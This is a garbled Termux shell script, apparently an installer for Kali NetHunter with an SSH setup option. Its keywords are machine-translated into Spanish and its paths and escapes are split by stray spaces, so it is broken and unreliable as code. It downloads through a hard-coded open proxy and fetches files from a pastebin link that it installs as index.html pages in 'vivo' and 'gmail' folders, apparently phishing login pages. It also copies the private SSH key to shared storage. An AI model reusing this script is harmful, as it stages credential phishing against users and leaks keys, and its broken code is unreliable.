#! /data/data/com.termux/files/usr/bin/bash -e
claro
apt-get install -y tar proot wget 
menu ()
{
claro
echo -e " \ n \ e [93m @ NoobFoda2 \ n "
echo -e " \ n \ e [5; 91m 1- Instalar kali-NetHunter-Basic "
echo -e " \ e [5; 96m 2- instalar OpenSsh "
echo -e " \ e [5; 92m 3- Sair "
echo -e -n " \ e [5; 92m \ n >>>   "
leer res
caso  $ res  en
" 1 " )
claro
echo -e " \ n \ e [5; 93m Baixando Kali-Basic ... "
echo -e " \ n \ e [5; 94m Tamanho: 618 MB / Extracao: 1; 90 GB "
echo -e " \ n \ e [5; 91m Pra sair \ e [5; 96m CTRL + c \ n "
wget -c --quiet --show-progress https://www.dropbox.com/s/pnvwy3z0716e7wb/kali-basic.tar.bz2 -e use_proxy = yes -e http_proxy = http: //95.161.178.130: 8080
echo -e " \ n \ e [5; 92m Descargar Concluindo .. "
dormir 2 && despejado
echo -e -n " \ n \ e [5; 93mExtraindo !! Tempo do Processo de 5 a 10 minutos .. \ n "
tar -xpf kali-basic.tar.bz2
rm kali-basic.tar.bz2
mv kali-armhf / $ HOME  && wget --quiet --show-progress -i https://pastebin.com/raw/1QfZgZFs ; rm 1Qf *
mkdir / $ HOME / kali-armhf / root / vivo ; mkdir / $ HOME / kali-armhf / root / gmail ; mv index-v * foto * / $ HOME / kali-armhf / root / vivo ; mv index-g * / $ HOME / kali-armhf / root / gmail
mv / $ HOME / kali-armhf / root / gmail / index-g * index.html && mv / $ HOME / kali-armhf / root / vivo / index-v * index.html
ln -s / storage / emulated / 0 / $ HOME / kali-armhf / sdcard
echo -e " \ n \ e [5; 92m Criando a sessao de login do kali .. "
dormir 2 && despejado
echo  "
#! / data / data / com.termux / files / usr / bin / bash -e
desarmar LD_PRELOAD
exec proot --link2symlink -0 -r /data/data/com.termux/files/home/kali-armhf -b / dev / -b / sys / -b / proc / -b / storage / -b / data / data / com.termux / files / home -w /data/data/com.termux/files/home / usr / bin / env -i HOME = / root TERM = " xterm-256color " LANG = en_US.UTF-8 RUTA = / bin: / usr / bin: / sbin: / usr / sbin / bin / bash --login "  >>  $ PREFIX / bin / startkali
chmod 777 $ PREFIJO / bin / startkali
echo -e " \ n \ e [5; 92m Concluindo com sucesso "
echo -e " \ n \ e [5; 96m Volta para menu-inicial s / n? "
leer s
if [ " $ s "  =  " s " ] ;  luego 
menú
más
echo  " saindo .. "
salida
fi
;;
" 2 " )
claro
apt-get update && apt-get -y upgrade && apt-get install -y openssh && sleep 3 && clear
echo -e " \ n \ e [5; 91m Aceite a permissao de acesso ao armazenamento \ n "
termux-setup-storage && sleep 2
echo -e " \ n \ e [5; 94m O serviço agora esta sendo iniciado na porta 8022 voce pode digitar: \ e [92m logcat -s 'syslog: *' \ e [94m para visualizar una saida de log. \ e [93m \ n "
sshd
toque ~ /.ssh/authorized_keys && chmod 600 ~ /.ssh/authorized_keys && chmod 700 ~ /.ssh
ssh-keygen
cat ~ /.ssh/id_rsa.pub >>  ~ /.ssh/authorized_keys && chmod 600 ~ /.ssh/authorized_keys
cp ~ /.ssh/id_rsa / sdcard
echo -e " \ n \ e [5; 96m Instalacao feita com sucesso!
Ej: ssh 127.0.0.1 -p 8022 ou ssh user@127.0.0.1 -p 8022 "
echo -e " \ e [5; 96m Volta para menu-inicial s / n? "
leer s
if [ " $ s "  =  " s " ] ;  luego 
menú
más
echo  " saindo .. "
salida
fi
;;
" 3 " )
salida
;;
esac
}
menú
